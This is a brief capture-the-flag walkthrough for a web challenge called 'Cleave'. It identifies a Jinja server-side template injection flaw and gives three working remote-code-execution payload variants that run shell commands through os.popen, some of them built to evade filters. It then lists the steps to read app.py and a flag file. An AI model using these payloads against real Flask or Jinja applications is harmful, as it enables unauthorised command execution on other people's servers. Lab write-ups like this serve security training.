For Cleave, as the hint suggests the web application has an SSTI vulnerability. First you have to find what templating engine the application is using.

This challenge, the web application uses Jinja templating engine which primarily used by apps created with python. 

Use the RCE payload to gain access, 
{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("ls").read() }}
{{ config.__class__.from_envvar["__globals__"]["__builtins__"]["__import__"]("os").popen("ls").read() }}
{{ (config|attr("__class__")).from_envvar["__globals__"]["__builtins__"]["__import__"]("os").popen("ls").read() }}

After that you'll see few files and directories

First cat app.py, you'll get the first half of the flag

Navigate to the home/Agent-Nightfall/Missions/Korea/Seoul/Gangnam
You'll see a file called flag.txt
